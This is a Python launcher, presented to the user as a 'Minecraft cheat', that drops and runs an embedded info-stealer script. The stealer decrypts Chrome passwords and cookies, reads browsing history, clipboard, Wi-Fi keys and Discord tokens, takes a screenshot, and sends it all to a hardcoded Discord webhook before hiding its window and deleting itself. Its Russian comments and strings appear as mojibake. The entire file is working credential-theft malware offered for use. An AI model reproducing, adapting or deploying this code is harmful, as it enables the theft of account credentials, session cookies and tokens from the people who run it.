import os
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox
import logging

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è launcher.py
logging.basicConfig(filename='launcher_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# –ö–æ–¥ –¥–ª—è stealer.py
STEALER_CODE = """
import os
import sqlite3
import win32crypt
import json
import requests
import shutil
import platform
import psutil
from datetime import datetime, timezone
from pathlib import Path
import traceback
import logging
import time
import subprocess
import tempfile
from PIL import ImageGrab
import tkinter as tk
from tkinter import messagebox
import pyperclip

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è stealer.py
logging.basicConfig(filename='stealer_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# –í–µ–±—Ö—É–∫ Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_"

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        logging.info("–°–∫—Ä–∏–Ω—à–æ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ screenshot.png")
        return screenshot_path
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {str(e)}\\n{traceback.format_exc()}")
        return None

def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content[:1000] if clipboard_content else "–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø—É—Å—Ç"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_clipboard: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def get_chrome_history():
    try:
        history = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome History database not found")
            return "–ò—Å—Ç–æ—Ä–∏—è Chrome –Ω–µ –Ω–∞–π–¥–µ–Ω–∞"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            history_db = tmp_file.name
        shutil.copy2(chrome_path, history_db)
        with sqlite3.connect(history_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            for url, title, last_visit_time in cursor.fetchall():
                # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤—Ä–µ–º–µ–Ω–∏ Chrome –≤ —á–∏—Ç–∞–µ–º—ã–π —Ñ–æ—Ä–º–∞—Ç
                if last_visit_time:
                    epoch_time = (last_visit_time / 1000000) - 11644473600  # Chrome timestamp to Unix epoch
                    visit_time = datetime.fromtimestamp(epoch_time, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
                    history.append(f"URL: {url}\\n–ó–∞–≥–æ–ª–æ–≤–æ–∫: {title}\\n–í—Ä–µ–º—è: {visit_time}")
        for _ in range(5):
            try:
                os.remove(history_db)
                break
            except Exception as e:
                logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å History.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(history)[:1000] if history else "–ò—Å—Ç–æ—Ä–∏—è –ø—É—Å—Ç–∞"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_chrome_history: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def get_chrome_cookies():
    try:
        cookies = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome Cookies database not found")
            return "Chrome Cookies database not found"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            cookies_db = tmp_file.name
        shutil.copy2(chrome_path, cookies_db)
        with sqlite3.connect(cookies_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, value in cursor.fetchall():
                if value:
                    try:
                        decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode()
                        cookies.append(f"{host} | {name} | {decrypted_value}")
                    except Exception as e:
                        logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –∫—É–∫–∏: {host} | {name}, –æ—à–∏–±–∫–∞: {str(e)}")
        for _ in range(5):
            try:
                os.remove(cookies_db)
                break
            except Exception as e:
                logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å Cookies.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(cookies)[:1000] if cookies else "–ù–µ—Ç –∫—É–∫–∏"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_chrome_cookies: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def get_chrome_passwords():
    try:
        passwords = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome Login Data database not found")
            return "Chrome Login Data database not found"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            login_data_db = tmp_file.name
        shutil.copy2(chrome_path, login_data_db)
        with sqlite3.connect(login_data_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                if pwd and user:
                    try:
                        decrypted_pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                        passwords.append(f"URL: {url}\\n–õ–æ–≥–∏–Ω: {user}\\n–ü–∞—Ä–æ–ª—å: {decrypted_pwd}")
                    except Exception as e:
                        logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –ø–∞—Ä–æ–ª—å –¥–ª—è {url}: {str(e)}")
        if passwords:
            with open("LoginData.txt", "w", encoding="utf-8") as f:
                f.write("\\n\\n".join(passwords))
        for _ in range(5):
            try:
                os.remove(login_data_db)
                break
            except Exception as e:
                logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å LoginData.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(passwords)[:1000] if passwords else "–ù–µ—Ç –ø–∞—Ä–æ–ª–µ–π"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_chrome_passwords: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def get_wifi_passwords():
    try:
        data = os.popen("netsh wlan show profiles").read()
        profiles = [line.split(":")[1].strip() for line in data.splitlines() if "All User Profile" in line]
        wifi_data = []
        for profile in profiles:
            details = os.popen(f'netsh wlan show profile name="{profile}" key=clear').read()
            for line in details.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    wifi_data.append(f"Wi-Fi: {profile}\\n–ü–∞—Ä–æ–ª—å: {password}")
        return "\\n".join(wifi_data)[:1000] if wifi_data else "–ù–µ—Ç Wi-Fi –ø–∞—Ä–æ–ª–µ–π"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_wifi_passwords: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def get_system_info():
    try:
        info = {
            "OS": platform.system() + " " + platform.release(),
            "CPU": platform.processor(),
            "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "Username": os.getlogin(),
            "Timestamp": datetime.now(timezone.utc).isoformat()
        }
        return info
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_system_info: {str(e)}\\n{traceback.format_exc()}")
        return {"–û—à–∏–±–∫–∞": str(e)}

def get_discord_tokens():
    try:
        tokens = []
        discord_path = os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb")
        if not os.path.exists(discord_path):
            return "Discord –Ω–µ –Ω–∞–π–¥–µ–Ω"
        for file in os.listdir(discord_path):
            if file.endswith((".log", ".ldb")):
                with open(os.path.join(discord_path, file), "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                    if "token" in content:
                        for line in content.splitlines():
                            if "token" in line:
                                parts = line.split('"token":"')
                                if len(parts) > 1:
                                    token_part = parts[1].split('"')[0]
                                    tokens.append(token_part)
        return "\\n".join(tokens)[:1000] if tokens else "–¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã"
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ get_discord_tokens: {str(e)}\\n{traceback.format_exc()}")
        return f"–û—à–∏–±–∫–∞: {str(e)}"

def send_to_discord(data, screenshot_path=None):
    try:
        embed = {
            "title": "–î–∞–Ω–Ω—ã–µ —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞",
            "color": 0x00ff00,
            "fields": [
                {"name": "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å", "value": data["system"]["Username"], "inline": True},
                {"name": "üíª –û–°", "value": data["system"]["OS"], "inline": True},
                {"name": "üß† –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä", "value": data["system"]["CPU"], "inline": False},
                {"name": "üñ•Ô∏è –ü–∞–º—è—Ç—å", "value": data["system"]["RAM"], "inline": True},
                {"name": "üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞", "value": data["clipboard"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üåê –ò—Å—Ç–æ—Ä–∏—è Chrome", "value": data["history"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üîë –ü–∞—Ä–æ–ª–∏ Chrome", "value": data["passwords"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üç™ –ö—É–∫–∏ Chrome", "value": data["cookies"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üì∂ Wi-Fi –ø–∞—Ä–æ–ª–∏", "value": data["wifi"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üéÆ Discord —Ç–æ–∫–µ–Ω—ã", "value": data["tokens"] or "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", "inline": False},
                {"name": "üïí –í—Ä–µ–º—è", "value": data["system"]["Timestamp"], "inline": True}
            ]
        }
        files = {}
        if os.path.exists("LoginData.txt"):
            files["file1"] = ("LoginData.txt", open("LoginData.txt", "rb"))
        if screenshot_path and os.path.exists(screenshot_path):
            files["file2"] = ("screenshot.png", open(screenshot_path, "rb"))
        if files:
            response = requests.post(WEBHOOK_URL, data={"payload_json": json.dumps({"embeds": [embed]})}, files=files)
            for file in files.values():
                file[1].close()
        else:
            response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        response.raise_for_status()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ send_to_discord: {str(e)}\\n{traceback.format_exc()}")
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {str(e)}")
    finally:
        if os.path.exists("LoginData.txt"):
            for _ in range(5):
                try:
                    os.remove("LoginData.txt")
                    break
                except Exception as e:
                    logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å LoginData.txt: {str(e)}")
                    time.sleep(1)
        if screenshot_path and os.path.exists(screenshot_path):
            for _ in range(5):
                try:
                    os.remove(screenshot_path)
                    break
                except Exception as e:
                    logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å screenshot.png: {str(e)}")
                    time.sleep(1)

def show_message_box():
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("–°–æ–æ–±—â–µ–Ω–∏–µ", "–Ω—É –∫–∞–∫ —Ç–∞–º —Ä–∞—Ç–∫–∞?")
        root.destroy()
        logging.info("Message box '–Ω—É –∫–∞–∫ —Ç–∞–º —Ä–∞—Ç–∫–∞?' –æ—Ç–æ–±—Ä–∞–∂—ë–Ω")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–∏ message box: {str(e)}\\n{traceback.format_exc()}")

def main():
    try:
        subprocess.run('taskkill /IM chrome.exe /F', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        screenshot_path = take_screenshot()
        data = {
            "system": get_system_info(),
            "clipboard": get_clipboard(),
            "history": get_chrome_history(),
            "passwords": get_chrome_passwords(),
            "cookies": get_chrome_cookies(),
            "wifi": get_wifi_passwords(),
            "tokens": get_discord_tokens()
        }
        send_to_discord(data, screenshot_path)
        show_message_box()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ main: {str(e)}\\n{traceback.format_exc()}")
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
    finally:
        current_file = os.path.abspath(__file__)
        subprocess.Popen(f'cmd.exe /c ping 127.0.0.1 -n 1 > nul & del "{current_file}"', shell=True)

if __name__ == "__main__":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
"""

def main():
    try:
        logging.info("–ó–∞–ø—É—Å–∫ launcher.py")

        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ "–ü—Ä–∏–≤–µ—Ç" –≤ –æ–∫–Ω–µ
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Minecraft –ß–∏—Ç", "–ü—Ä–∏–≤–µ—Ç")
        root.destroy()
        logging.info("–û–∫–Ω–æ '–ü—Ä–∏–≤–µ—Ç' –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–æ")

        # –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∫ —Ä–∞–±–æ—á–µ–º—É —Å—Ç–æ–ª—É
        desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
        stealer_path = os.path.join(desktop_path, "stealer.py")
        logging.info(f"–ü—É—Ç—å –∫ stealer.py: {stealer_path}")

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å—å
        if not os.access(desktop_path, os.W_OK):
            logging.error("–ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å—å –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª")
            raise PermissionError("–ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å—å –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª")

        # –¢–µ—Å—Ç–æ–≤—ã–π –∑–∞–ø—É—Å–∫ cmd
        logging.info("–ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç—å cmd —Å —Ç–µ—Å—Ç–æ–≤—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º")
        process_test = subprocess.Popen(['cmd.exe', '/c', 'echo', '–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process_test.wait()
        logging.info("cmd —Å —Ç–µ—Å—Ç–æ–≤—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∞")

        # –°–æ–∑–¥–∞–µ–º stealer.py –Ω–∞–ø—Ä—è–º—É—é, –±–µ–∑ cmd
        logging.info("–°–æ–∑–¥–∞–Ω–∏–µ stealer.py")
        with open(stealer_path, 'w', encoding='utf-8') as f:
            f.write(STEALER_CODE)
        logging.info("stealer.py —Å–æ–∑–¥–∞–Ω")

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω
        if not os.path.exists(stealer_path):
            logging.error("stealer.py –Ω–µ –±—ã–ª —Å–æ–∑–¥–∞–Ω")
            raise FileNotFoundError("stealer.py –Ω–µ –±—ã–ª —Å–æ–∑–¥–∞–Ω")

        # –ó–∞–ø—É—Å–∫–∞–µ–º stealer.py –Ω–∞–ø—Ä—è–º—É—é
        logging.info("–ó–∞–ø—É—Å–∫ stealer.py")
        process_stealer = subprocess.Popen(['py', stealer_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process_stealer.wait()
        logging.info("stealer.py –≤—ã–ø–æ–ª–Ω–µ–Ω")

    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞: {str(e)}")
        raise

if __name__ == "__main__":
    # –°–∫—Ä—ã–≤–∞–µ–º –∫–æ–Ω—Å–æ–ª—å .exe
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()